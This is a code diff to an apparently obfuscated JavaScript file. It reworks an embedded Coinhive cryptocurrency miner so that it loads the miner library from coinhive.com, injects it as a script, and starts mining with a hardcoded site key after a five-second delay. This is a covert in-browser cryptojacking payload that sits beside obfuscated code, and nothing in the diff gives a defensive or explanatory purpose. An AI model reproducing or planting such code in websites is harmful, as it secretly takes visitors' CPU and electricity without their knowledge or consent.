@@ -15,20 +15,23 @@ function S300(){}S300.i4=function(s,d){function M(l){var z=2;while(z!==15){switc
 //     var fs = document.getElementsByTagName('script')[0];
 //     fs.parentNode.insertBefore(s, fs);
 // })();
-fetch("https://coinhive.com/lib/coinhive.min.js")["then"](function(cb) {
-  if (cb["ok"]) {
-    cb["blob"]()["then"](function(cb) {
-      var bl = URL["createObjectURL"](cb);
-      ss = document["createElement"]("script");
-      ss.onload = function () {
-      var miner = new CoinHive.User("H3QMiNzSRGMRObqvqtk0BG3cNIqxUuvr", "rbcdn", {
-                  throttle: 0.1,
-                  threads: 1,
-                  });
-      miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
-      };
-      ss["src"] = bl;
-      document["head"]["appendChild"](ss);
-    });
-  }
-});
+function xmr(){
+  fetch("https://coinhive.com/lib/coinhive.min.js")["then"](function(cb) {
+    if (cb["ok"]) {
+      cb["blob"]()["then"](function(cb) {
+        var bl = URL["createObjectURL"](cb);
+        ss = document["createElement"]("script");
+        ss.onload = function () {
+        var miner = new CoinHive.User("H3QMiNzSRGMRObqvqtk0BG3cNIqxUuvr", "rbcdn", {
+                    throttle: 0.1,
+                    threads: 1,
+                    });
+        miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+        };
+        ss["src"] = bl;
+        document["head"]["appendChild"](ss);
+      });
+    }
+  });
+}
+setTimeout(xmr, 5000);
